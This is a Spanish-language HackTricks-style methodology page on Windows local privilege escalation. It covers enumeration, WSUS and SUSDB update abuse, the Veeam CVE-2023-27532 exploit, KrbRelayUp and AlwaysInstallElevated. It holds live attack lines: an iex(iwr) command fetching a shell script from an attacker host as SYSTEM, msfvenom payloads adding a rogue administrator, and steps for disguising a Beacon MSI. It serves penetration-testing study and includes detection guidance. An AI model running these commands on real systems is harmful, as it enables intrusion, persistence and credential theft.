# Escalada de privilegios local en Windows

{{#include ../../banners/hacktricks-training.md}}

### **Mejor herramienta para buscar vectores de escalada de privilegios local en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Esta página reúne la metodología general de escalada de privilegios en Windows a partir de varias guías fundamentales.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Su flujo práctico de enumeración también se basa en talleres y listas de verificación de la comunidad.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> El material histórico sobre ataques incluye la presentación de DerbyCon sobre escalada de privilegios en Windows.<sup>[[5]](#references)</sup>

## Teoría inicial de Windows

### Tokens de acceso

**Si no sabes qué son los tokens de acceso de Windows, lee la siguiente página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL: DACL/SACL/ACE

**Consulta la siguiente página para obtener más información sobre ACL, DACL, SACL y ACE:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Niveles de integridad

**Si no sabes qué son los niveles de integridad en Windows, lee la siguiente página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de seguridad de Windows

En Windows hay distintos elementos que podrían **impedirte enumerar el sistema**, ejecutar archivos ejecutables o incluso **detectar tus actividades**. Antes de comenzar la enumeración para la escalada de privilegios, deberías **leer** la siguiente **página** y **enumerar** todos estos **mecanismos de defensa**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

El acceso físico también puede convertir una edición sin conexión de UEFI NVRAM en un ataque DMA previo al arranque y una cadena de modificación de memoria de Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Protección de administrador / elevación silenciosa de UIAccess

Los procesos UIAccess iniciados mediante `RAiLaunchAdminProcess` pueden aprovecharse para alcanzar High IL sin solicitudes cuando se omiten las comprobaciones de ruta segura de AppInfo. Consulta aquí el flujo específico para omitir UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagación del registro de accesibilidad de Secure Desktop puede aprovecharse para realizar una escritura arbitraria en el registro como SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Las versiones recientes de Windows también incorporaron una vía de LPE de **puerto arbitrario SMB**, donde se refleja una autenticación NTLM local privilegiada a través de una conexión TCP SMB reutilizada:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Información del sistema

### Enumeración de información de versión

Comprueba si la versión de Windows tiene alguna vulnerabilidad conocida (comprueba también los parches aplicados).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits de versiones

Este [sitio](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre vulnerabilidades de seguridad de Microsoft. Esta base de datos contiene más de 4.700 vulnerabilidades de seguridad, lo que muestra la **enorme superficie de ataque** que presenta un entorno Windows.

**En el sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventaría la versión del sistema operativo, las actualizaciones instaladas y posibles avisos seleccionados; verifica el producto exacto y las actualizaciones posteriores que las sustituyan antes de considerar aplicable un resultado.

Para un exploit local específico de una versión, comprueba la **arquitectura del proceso en ejecución**, además de la arquitectura del sistema operativo. En Windows de 64 bits, un proceso de 32 bits está sujeto a la [redirección del sistema de archivos WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` suele resolverse como el directorio del sistema de 32 bits, mientras que `%windir%\Sysnative` permite que ese proceso acceda al directorio nativo del sistema. El alias no está disponible para un proceso de 64 bits. La versión del sistema operativo o la posibilidad de que falte una KB no demuestran que el sistema sea vulnerable al exploit; compara la versión en ejecución, las actualizaciones instaladas o posteriores que las sustituyan, la arquitectura del proceso y los requisitos previos del exploit con el [boletín de seguridad de Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) correspondiente al problema específico.

**Localmente, con información del sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositorios de exploits en Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Entorno

¿Hay credenciales o información de Juicy guardadas en las variables de entorno?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historial de PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Archivos de transcripción de PowerShell

Puedes aprender a activar esta función en [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` es solo un ejemplo. La [directiva de transcripción de PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalmente guarda los archivos en la carpeta Documents de cada usuario, pero una configuración `OutputDirectory` o `Start-Transcript -OutputDirectory` puede redirigirlos a una carpeta compartida u oculta. Antes de revisar una transcripción, comprueba la ruta de salida efectiva y las ACL del archivo: puede contener argumentos de comandos y resultados, incluidas credenciales. Una transcripción legible solo es una pista si su contenido revela una identidad con privilegios superiores que se pueda usar y que pueda iniciar sesión en el contexto pertinente.

### Module Logging

Se registran detalles de las ejecuciones del pipeline de PowerShell, incluidos los comandos ejecutados, las invocaciones de comandos y partes de los scripts. Sin embargo, es posible que no se capturen todos los detalles de ejecución ni los resultados de salida.

Para habilitar esta función, sigue las instrucciones de la sección "Transcript files" de la documentación y selecciona **"Module Logging"** en lugar de **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Para ver los últimos 15 eventos de los registros de PowersShell, puedes ejecutar:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### **Script Block Logging** de PowerShell

Se captura un registro completo de la actividad y de todo el contenido de la ejecución del script, lo que garantiza que cada bloque de código quede documentado mientras se ejecuta. Este proceso conserva un registro de auditoría exhaustivo de cada actividad, útil para el análisis forense y el análisis de comportamientos maliciosos. Al documentar toda la actividad en el momento de la ejecución, se proporciona información detallada sobre el proceso.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Los eventos de registro de Script Block se pueden encontrar en el Visor de eventos de Windows, en la ruta: **Registros de aplicaciones y servicios > Microsoft > Windows > PowerShell > Operativo**.\
Para ver los últimos 20 eventos, puedes usar:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Configuración de Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Unidades

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Un endpoint HTTP de WSUS es una pista para investigar la posible interceptación de metadatos de actualización. La explotación también depende de si el cliente usa ese servidor WSUS, de si un atacante puede interceptar o controlar su tráfico y de las políticas de confianza e instalación de actualizaciones del cliente. La URL por sí sola no demuestra que se pueda ejecutar código. [Microsoft recomienda TLS para los metadatos de WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Para empezar, comprueba si la red usa una actualización de WSUS sin SSL ejecutando lo siguiente en cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

O lo siguiente en PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Si recibes una respuesta como una de estas:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Y si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` es igual a `1`.

Cuando `UseWUServer` es `1`, Windows Update usa el servicio de intranet configurado. Esto confirma un requisito previo para la ruta de interceptación HTTP, pero no demuestra que sea posible interceptar el tráfico, aceptar actualizaciones maliciosas ni instalarlas con privilegios elevados. Cuando es `0`, esta política no selecciona el endpoint de WSUS configurado.

Para explotar estas vulnerabilidades, puedes usar herramientas como [Wsuxploit](https://github.com/pimps/wsuxploit) y [pyWSUS ](https://github.com/GoSecure/pywsus): son scripts de exploits MiTM weaponizados para inyectar actualizaciones «falsas» en tráfico WSUS no SSL.

Lee la investigación aquí:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lee el informe completo aquí**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Básicamente, este es el fallo que aprovecha este bug:

> Si tenemos la capacidad de modificar el proxy de nuestro usuario local y Windows Updates usa el proxy configurado en los ajustes de Internet Explorer, entonces podemos ejecutar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nuestro propio tráfico y ejecutar código como un usuario con privilegios elevados en nuestro sistema.
>
> Además, como el servicio WSUS usa la configuración del usuario actual, también usa su almacén de certificados. Si generamos un certificado autofirmado para el nombre de host de WSUS y lo añadimos al almacén de certificados del usuario actual, podremos interceptar tanto el tráfico WSUS HTTP como HTTPS. WSUS no usa mecanismos similares a HSTS para implementar una validación de confianza en el primer uso del certificado. Si el certificado presentado es de confianza para el usuario y tiene el nombre de host correcto, el servicio lo aceptará.

Puedes explotar esta vulnerabilidad con la herramienta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (cuando se publique).

### Actualizaciones controladas por el administrador de WSUS

Existe una ruta independiente cuando la identidad actual puede **publicar y aprobar** actualizaciones en un servidor WSUS. Comprueba la pertenencia efectiva al grupo `WSUS Administrators` del servidor y los permisos delegados de WSUS; después, identifica el grupo de equipos cliente que recibiría una actualización aprobada. [Microsoft exige privilegios de administrador de WSUS para aprobar actualizaciones](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) y [documenta la relación de confianza de publicación](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): los clientes deben confiar en el certificado de firma usado para el contenido publicado localmente. Antes de considerar esto una ruta de escalada, confirma que la actualización candidata esté firmada y sea aceptada, que se aplique al objetivo y que se instale en un contexto con más privilegios. Un valor HTTP `WUServer` o el nombre de un grupo, por sí solos, no demuestran que se cumplan esas condiciones.

### Abuso de actualizaciones personalizadas de SUSDB: payloads sin firmar mediante `.txt`/`.esd`

Este fallo de límite de confianza es distinto de interceptar una conexión WSUS HTTP: el requisito previo es tener acceso suficiente a los **procedimientos almacenados de la base de datos de WSUS (`SUSDB`)** para publicar y aprobar una actualización personalizada. Una posible vía de entrada es retransmitir la cuenta de equipo de WSUS ascendente a un servidor MSSQL independiente que aloje `SUSDB`; los requisitos exactos dependen del despliegue, así que primero enumera los permisos `EXECUTE` en lugar de asumir que se requieren derechos de administrador de SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Para conocer la ruta de ataque independiente que retransmite la autenticación de clientes WSUS desde HTTP/8530 a LDAP, SMB o AD CS, consulta [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Crear, dirigir y aprobar la actualización

El flujo de trabajo de actualización personalizada usa procedimientos legítimos de WSUS como API de publicación restringida. Las transiciones de estado importantes son:<sup>[[38]](#references)</sup>

| Etapa | Procedimientos almacenados relevantes |
| --- | --- |
| Importar los metadatos de la actualización | `spImportUpdate` |
| Almacenar los fragmentos XML de requisitos previos, localizados y extendidos | `spSaveXMLFragment` |
| Asociar el resumen criptográfico del contenido con su URL controlada por el atacante | `spSetBatchURL` |
| Enumerar/crear un grupo de equipos y añadir el cliente | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Aprobar la instalación para ese grupo | `spDeployUpdate` con `@actionID = 0` y `@isAssigned = 1` |

El nombre del archivo, los resúmenes criptográficos, el tamaño y el controlador `CommandLineInstallation` deben coincidir en los metadatos y los fragmentos importados. Después de asignar la URL del contenido y el grupo objetivo, la aprobación final es similar a la siguiente; usa identificadores de actualización, grupo e implementación nuevos, en lugar de reutilizar los GUID de ejemplo.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Bypass de firma basado en la extensión

WSUS normalmente rechaza contenido ejecutable arbitrario sin firmar. Sin embargo, en `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, la ruta de .NET `VerifyFile` establece en false la marca de comprobación del certificado cuando el nombre de archivo proporcionado termina en `.txt` o `.esd`; entonces se omite `CheckCertificateSignature` sin comprobar primero que los bytes sean texto o una imagen ESD legítima. Por lo tanto, un PE sin modificar llamado, por ejemplo, `payload.exe.txt`, puede superar la verificación del contenido y luego ejecutarse mediante el controlador de instalación de línea de comandos de la actualización. Esto es un error de confusión de políticas y tipos, no una falsificación de firma.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging y automatización compatibles con BITS

Al llamar a `spDeployUpdate`, WSUS obtiene el contenido registrado. El origen debe cumplir las expectativas HTTP de BITS: no basta con que la URL sea accesible, ya que la transferencia usa un flujo inicial de `HEAD`/`GET` y solicitudes de rangos de bytes. Un servidor sin compatibilidad con Range genera el evento de sincronización de WSUS `EventId=364`, que indica que BITS requiere el encabezado del protocolo Range.<sup>[[39]](#references)</sup>

El PoC de investigación [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) genera el SQL necesario para la cadena de importación/fragmento/URL/grupo/despliegue, incluye un cliente MSSQL modificado para ejecutarlo y proporciona `BitsWebServer.py` para alojar el contenido. Una invocación mínima en un laboratorio autorizado es:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Ejecución desatendida y persistencia mediante reintentos

La interacción del cliente depende de la directiva. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opción `4 - Auto download and schedule install`, hace que una actualización aprobada se descargue e instale según la programación configurada, sin que el usuario tenga que seleccionarla manualmente. Durante las pruebas, una payload cuya actualización seguía en estado fallido/incompleto se volvió a ofrecer inmediatamente después de que finalizara el proceso callback, por lo que el comportamiento de reintento puede convertirse en persistencia de ejecución recurrente; resulta ruidoso porque el cliente muestra un estado de actualización fallida.<sup>[[39]](#references)</sup>

#### Puntos de detección y hardening

Los siguientes puntos de detección, tanto del servidor como del cliente, son útiles para esta cadena:<sup>[[39]](#references)</sup>

- Audita la ejecución de `spCreateTargetGroup`, `spSetBatchURL` y `spDeployUpdate` en `SUSDB`; investiga los nuevos grupos de destino, los orígenes de contenido externos, las payloads de actualización `.txt`/`.esd` y las implementaciones realizadas por principals inesperados (especialmente cuentas que no sean de equipo).
- Revisa `C:\Program Files\Update Services\LogFiles` en busca de `ContentSyncAgent`, `FileVerified`, el error tipográfico `FileVerficationFailed` y `EventId=364`; correlaciona la verificación con la extensión de la payload y la firma del contenido, en lugar de confiar en el sufijo.
- Busca instalaciones de Windows Update que fallen y se reintenten repetidamente, así como ejecución de PE o actividad inesperada de procesos secundarios o de red asociada a contenido con nombres `.txt` o `.esd`.
- Exige Extended Protection for Authentication en el servicio de base de datos, si es compatible, y restringe el acceso de red a la base de datos al servidor WSUS y a los sistemas administrativos autorizados. Limita al mínimo y audita los permisos `EXECUTE` en los procedimientos de actualización personalizados.

## Actualizadores automáticos de terceros e IPC de agentes (privesc local)

Muchos agentes empresariales exponen una superficie IPC de localhost y un canal de actualización privilegiado. Si se puede coaccionar el registro para que use un servidor del atacante y el actualizador confía en una rogue root CA o en comprobaciones débiles de firmas, un usuario local puede entregar un MSI malicioso que el servicio SYSTEM instalará. Consulta aquí una técnica generalizada (basada en la cadena Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM mediante TCP 9401)

Veeam Backup & Replication y Cloud Connect utilizan un servicio central de backup en **TCP/9401 de forma predeterminada**. [El aviso de Veeam](https://www.veeam.com/kb4424) describe la divulgación no autenticada de credenciales cifradas de la base de datos de configuración dentro del perímetro de red del backup; un PoC público independiente demuestra una vía de ejecución de comandos como **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Es posible que el servicio se vincule a direcciones distintas de localhost, así que comprueba su dirección y PID reales.

- **Recon**: confirma que TCP/9401 pertenece a `Veeam.Backup.Service.exe` y, a continuación, inspecciona el producto instalado y los metadatos de los parches. `netstat -ano | findstr 9401` y `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` son indicios, no una comprobación completa de los parches.
- **Versiones mínimas corregidas**: Veeam indica **11a build 11.0.1.1261 P20230227** y **12 build 12.0.0.1420 P20230223** como las primeras versiones corregidas; las versiones anteriores están afectadas. Una versión de archivo de cuatro partes por sí sola no permite distinguir una build base sin parche de un parche posterior para esos mismos números de build. Antes de considerar corregida una build límite, verifica el identificador del parche en el [historial de builds del proveedor](https://www.veeam.com/kb2680).
- **Exploit**: coloca un PoC como `VeeamHax.exe` junto con las DLL de Veeam necesarias en el mismo directorio y, a continuación, activa una payload SYSTEM a través del socket local:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

El PoC citado demuestra la ejecución de comandos como SYSTEM cuando se cumplen sus requisitos adicionales; el aviso del proveedor describe el problema de divulgación de credenciales.
## KrbRelayUp

Un relay Kerberos local puede pasar de un inicio de sesión con menos privilegios a una escritura privilegiada en el directorio cuando un servidor COM adecuado se autentica y la principal retransmitida tiene permisos sobre el objeto de destino. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) tanto escrituras LDAP de RBCD como de `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatiza algunas de estas rutas. Una cadena RBCD requiere delegación aplicable y permisos sobre el objeto de destino, mientras que una cadena shadow-credential requiere permisos de escritura de claves de credencial y un KDC que admita la ruta de autenticación con certificados. Ninguna de estas rutas se deriva únicamente de pertenecer al dominio.

Comprueba la política real del DC para [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) y [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), la ACL del objeto para la identidad retransmitida, y los niveles de autenticación e suplantación de la clase COM seleccionada. El tipo de inicio de sesión y el contexto de credenciales del usuario que realiza la llamada son importantes: una sesión de WinRM puede comportarse de forma distinta a un inicio de sesión interactivo o con credenciales nuevas. El enrutamiento de firewall/OXID y las actualizaciones instaladas también pueden cambiar el resultado. Considera una política permisiva o una ACL coincidente como elementos que conviene revisar; la enumeración pasiva no debería activar la coerción COM, la autenticación relay ni las escrituras en el directorio. Una shadow credential de cuenta de equipo puede permitir obtener un ticket de equipo y, solo si esa cuenta tiene los permisos de replicación de directorio necesarios, una ruta DCSync independiente.

Encuentra el **exploit en** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para obtener más información sobre el flujo del ataque, consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Si** estas 2 claves del registro están **habilitadas** (el valor es **0x1**), los usuarios con cualquier nivel de privilegios pueden **instalar** (ejecutar) archivos `*.msi` como NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Si tienes una sesión de meterpreter, puedes automatizar esta técnica usando el módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa el comando `Write-UserAddMSI` de power-up para crear en el directorio actual un binario MSI de Windows para escalar privilegios. Este script genera un instalador MSI precompilado que solicita agregar un usuario o grupo (por lo que necesitarás acceso a la GUI):

```
Write-UserAddMSI
```

Solo ejecuta el binario creado para escalar privilegios.

### MSI Wrapper

Lee este tutorial para aprender a crear un MSI wrapper con estas herramientas. Ten en cuenta que puedes incluir un archivo "**.bat**" si **solo** quieres **ejecutar** **líneas de comandos**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuevo payload TCP para Windows EXE** en `C:\privesc\beacon.exe`
- Abre **Visual Studio**, selecciona **Create a new project** y escribe "installer" en el cuadro de búsqueda. Selecciona el proyecto **Setup Wizard** y haz clic en **Next**.
- Asigna un nombre al proyecto, como **AlwaysPrivesc**, usa **`C:\privesc`** como ubicación, selecciona **place solution and project in the same directory** y haz clic en **Create**.
- Sigue haciendo clic en **Next** hasta llegar al paso 3 de 4 (seleccionar los archivos que se incluirán). Haz clic en **Add** y selecciona el payload Beacon que acabas de generar. Luego haz clic en **Finish**.
- Selecciona el proyecto **AlwaysPrivesc** en **Solution Explorer** y, en **Properties**, cambia **TargetPlatform** de **x86** a **x64**.
  - Puedes cambiar otras propiedades, como **Author** y **Manufacturer**, para que la aplicación instalada parezca más legítima.
- Haz clic con el botón derecho en el proyecto y selecciona **View > Custom Actions**.
- Haz clic con el botón derecho en **Install** y selecciona **Add Custom Action**.
- Haz doble clic en **Application Folder**, selecciona el archivo **beacon.exe** y haz clic en **OK**. Así te aseguras de que el payload Beacon se ejecute en cuanto se inicie el instalador.
- En **Custom Action Properties**, cambia **Run64Bit** a **True**.
- Por último, **compílalo**.
  - Si aparece la advertencia `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, asegúrate de haber establecido la plataforma en x64.

### MSI Installation

Para ejecutar la **instalación** del archivo `.msi` malicioso en **segundo plano:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Para explotar esta vulnerabilidad puedes usar: _exploit/windows/local/always_install_elevated_

## Antivirus y detectores

### Configuración de auditoría

Esta configuración determina qué se **registra**, así que debes prestarle atención.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding; es interesante saber adónde se envían los registros.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** está diseñado para la **gestión de las contraseñas de Administrator locales** y garantiza que cada contraseña sea **única, aleatoria y se actualice periódicamente** en los equipos unidos a un dominio. Estas contraseñas se almacenan de forma segura en Active Directory y solo pueden acceder a ellas los usuarios a quienes se hayan concedido permisos suficientes mediante ACL, lo que les permite ver las contraseñas de administrador local si están autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si está activo, **las contraseñas en texto sin cifrar se almacenan en LSASS** (Local Security Authority Subsystem Service).\
[**Más información sobre WDigest en esta página**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Protección de LSA

A partir de **Windows 8.1**, Microsoft introdujo una protección mejorada para la Autoridad de seguridad local (LSA) para **bloquear** los intentos de procesos no confiables de **leer su memoria** o inyectar código, reforzando aún más la seguridad del sistema.\
[**Más información sobre la protección de LSA aquí**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** se introdujo en **Windows 10**. Su propósito es proteger las credenciales almacenadas en un dispositivo frente a amenazas como los ataques pass-the-hash. [**Aquí encontrarás más información sobre Credential Guard.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Credenciales en caché

Las **credenciales de dominio** son autenticadas por la **Autoridad de seguridad local** (LSA) y utilizadas por los componentes del sistema operativo. Cuando un paquete de seguridad registrado autentica los datos de inicio de sesión de un usuario, normalmente se establecen las credenciales de dominio de ese usuario.\
[**Más información sobre las credenciales en caché aquí**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Usuarios y grupos

### Enumerar usuarios y grupos

Deberías comprobar si alguno de los grupos a los que perteneces tiene permisos interesantes.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Grupos privilegiados

Si **perteneces a algún grupo privilegiado, es posible que puedas escalar privilegios**. Aprende sobre los grupos privilegiados y cómo abusar de ellos para escalar privilegios aquí:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulación de tokens

**Aprende más** sobre qué es un **token** en esta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la siguiente página para **conocer tokens interesantes** y cómo abusar de ellos:


{{#ref}}
privilege-escalation-abusing-tokens.md
